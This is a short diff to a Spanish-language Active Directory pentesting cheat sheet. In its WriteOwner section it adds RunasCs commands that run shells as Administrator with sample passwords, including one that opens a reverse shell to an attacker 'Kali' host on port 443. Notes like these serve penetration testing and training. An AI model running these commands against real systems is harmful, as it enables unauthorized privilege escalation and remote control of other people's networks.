@@ -18,6 +18,21 @@ Se pueden ver las ACLs en la herramienta de BloodHound.
 
 ## WriteOwner
 
+* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
+
+```powershell 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe"
+# Ejecutar una reverse shell a Kali 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 
+
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
+	# -l 9 = Mismo comportamiento que '/netonly'
+
+# Ejecutar un comando 
+❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
+```
+
 ```powershell  
 Primero se hace la autenticación en Windows con el usuario comprometido y en cada actualización se debe de renovar el token para tener los privilegios actualizados. Lo que significa que se debe de volver a iniciar sesión en Powershell con Runas.
 
